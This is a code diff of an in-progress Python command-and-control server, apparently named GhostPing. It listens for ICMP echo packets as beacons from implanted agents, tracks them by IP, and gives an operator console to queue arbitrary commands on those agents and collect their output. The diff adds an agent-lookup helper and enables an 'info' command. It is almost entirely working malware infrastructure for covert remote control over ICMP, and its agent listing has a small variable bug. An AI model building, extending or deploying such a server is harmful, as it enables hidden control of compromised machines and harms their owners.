@@ -3,15 +3,18 @@ import time
 import os
 import threading
 
+# ======== Initializing data sets =========
+
 COMMANDS = {} #agent_id -> list of commands
 ACTIVE_AGENTS = set() #set of active agent ids
 AGENT_INFO = {} #agent_id -> {"ip","last_seen"}
 RESULTS = {} #agent_id -> list of results
-INACTIVITY_TIMEOUT = 120 # number of seconds before agent becomes stale
+INACTIVITY_TIMEOUT = 120 # number of seconds before agents become stale (remove from active agents set)
 
 lock = threading.Lock()
 
-# Helper functions
+# ======== Helper functions ========
+
 def get_next_agent_id():
     # Returns the next available agent ID as a 3-digit string.
     if not AGENT_INFO:
@@ -28,6 +31,28 @@ def get_next_agent_id():
         raise Exception("Maximum number of agents reached")
     return f"{next_id:03d}"  # format as 3-digit string
 
+def find_agent_by_identifier(identifier):
+    """
+    Resolve an identifier which may be:
+      - exact agent_id
+      - IPv4 address string that matches a known agent
+    Returns the agent_id if found, otherwise None.
+    """
+    with lock:
+        # direct match to agent id
+        if identifier in ACTIVE_AGENTS:
+            return identifier
+        # match by IP
+        for aid, info in AGENT_INFO.items():
+            if not info:
+                continue
+            ip = info.get('ip')
+            if identifier == ip:
+                return aid
+    return None
+
+# ======== Main functionality =========
+
 def handle_packet(pkt):
     try:
         if ICMP in pkt and pkt[ICMP].type == 8 and Raw in pkt:
@@ -42,7 +67,8 @@ def handle_packet(pkt):
                 return  # ignore noise or non-client pings
 
             src = pkt[IP].src
-            print(f"\n[+] Valid client packet from {src}: {payload}")
+            
+            # print(f"\n[+] Valid client packet from {src}: {payload}")
 
             # Check if this IP is already registered
             agent_id = None
@@ -82,16 +108,6 @@ def handle_packet(pkt):
         print(f"!Handler exception: {e}")
 
 def operator_console():
-    print()
-    print("--------------------------------------------------")
-    print(r"   ________               __  ____  _            ")
-    print(r"  / ____/ /_  ____  _____/ /_/ __ \(_)___  ____ _")
-    print(r" / / __/ __ \/ __ \/ ___/ __/ /_/ / / __ \/ __ `/")
-    print(r"/ /_/ / / / / /_/ (__  ) /_/ ____/ / / / / /_/ / ")
-    print(r"\____/_/ /_/\____/____/\__/_/   /_/_/ /_/\__, /  ")
-    print(r"                                        /____/  ")
-    print("--------------------------------------------------")
-    print()
 
     print("[*] Operator console ready. Type 'help' for commands.")
     while True:
@@ -104,15 +120,15 @@ def operator_console():
         if not cmd_line:
             continue
 
-        parts = cmd_line.split(" ", 2)  # Splits the task command into two parts: the identifier (id, ip, or hostname) and the command.
+        parts = cmd_line.split(" ", 2)  # Splits the task command into two parts: the identifier (id, ip) and the command.
         cmd = parts[0].lower()
 
         if cmd == "help":
             print("Commands:")
-            print("  list                         - List active agents (shows id, ip, hostname, age)")
-            print("  info <id|ip|hostname>        - Show detailed info for an agent")
-            print("  task <id|ip|hostname> <cmd>  - Queue a command for an agent")
-            print("  results <id|ip|hostname>     - Show results from an agent")
+            print("  list                         - List active agents (shows id, ip, age)")
+            print("  info <id|ip>        - Show detailed info for an agent")
+            print("  task <id|ip> <cmd>  - Queue a command for an agent")
+            print("  results <id|ip>     - Show results from an agent")
             print("  exit                         - Stop the server")
             continue
 
@@ -135,34 +151,32 @@ def operator_console():
                     for agent in sorted(ACTIVE_AGENTS):
                         info = AGENT_INFO.get(agent, {})
                         ip = info.get('ip', 'unknown')
-                        host = info.get('hostname', 'unknown')
-                        age = int(now - now - AGENT_INFO[agent_id]["last_seen"])
-                        print(f" - id={agent} ip={ip} host={host} age={age}s")
+                        age = int(now - AGENT_INFO[agent_id]["last_seen"])
+                        print(f" - id={agent} ip={ip} age={age}s")
             continue
 
-        # if cmd == "info":
-        #     if len(parts) < 2:
-        #         print("Usage: info <agent_id|ip|hostname>")
-        #         continue
-        #     identifier = parts[1]
-        #     aid = find_agent_by_identifier(identifier)
-        #     if not aid:
-        #         print("No such agent.")
-        #         continue
-        #     with lock:
-        #         info = AGENT_INFO.get(aid, {})
-        #         print(f"Agent ID: {aid}")
-        #         print(f"  IP: {info.get('ip', 'unknown')}")
-        #         print(f"  Hostname: {info.get('hostname', 'unknown')}")
-        #         age = int(time.time() - LAST_SEEN.get(aid, time.time()))
-        #         print(f"  Last seen: {age}s ago")
-        #         print(f"  Queued tasks: {len(COMMANDS.get(aid, []))}")
-        #         print(f"  Stored result chunks: {len(RESULTS.get(aid, []))}")
-        #     continue
+        if cmd == "info":
+            if len(parts) < 2:
+                print("Usage: info <agent_id|ip>")
+                continue
+            identifier = parts[1] # This could be agent id or ip
+            agent_id = find_agent_by_identifier(identifier)
+            if not agent_id:
+                print("No such agent.")
+                continue
+            with lock:
+                info = AGENT_INFO.get(agent_id, {})
+                print(f"  Agent ID: {agent_id}")
+                print(f"  IP: {info.get('ip', 'unknown')}")
+                age = int(time.time() - AGENT_INFO[agent_id]["last_seen"])
+                print(f"  Last seen: {age}s ago")
+                print(f"  Queued tasks: {len(COMMANDS.get(agent_id, []))}")
+                print(f"  Stored result chunks: {len(RESULTS.get(agent_id, []))}")
+            continue
 
         if cmd == "task":   # working on this
             if len(parts) < 3:
-                print("Usage: task <agent_id|ip|hostname> <command>")
+                print("Usage: task <agent_id|ip> <command>")
                 continue
             identifier = parts[1]
             command_text = parts[2]
@@ -179,7 +193,7 @@ def operator_console():
 
         if cmd == "results":
             if len(parts) < 2:
-                print("Usage: results <agent_id|ip|hostname>")
+                print("Usage: results <agent_id|ip>")
                 continue
             identifier = parts[1]
             if not identifier:
@@ -204,7 +218,17 @@ def operator_console():
         print("Unknown command. Type 'help'.")
 
 def main():
-    print("[*] Starting ICMP C2 server...")
+    print()
+    print("--------------------------------------------------")
+    print(r"   ________               __  ____  _            ")
+    print(r"  / ____/ /_  ____  _____/ /_/ __ \(_)___  ____ _")
+    print(r" / / __/ __ \/ __ \/ ___/ __/ /_/ / / __ \/ __ `/")
+    print(r"/ /_/ / / / / /_/ (__  ) /_/ ____/ / / / / /_/ / ")
+    print(r"\____/_/ /_/\____/____/\__/_/   /_/_/ /_/\__, /  ")
+    print(r"                                        /____/  ")
+    print("--------------------------------------------------")
+    print()
+
     # start operator console in background
     threading.Thread(target=operator_console, daemon=True).start()
     # start sniffing for ICMP beacons / results
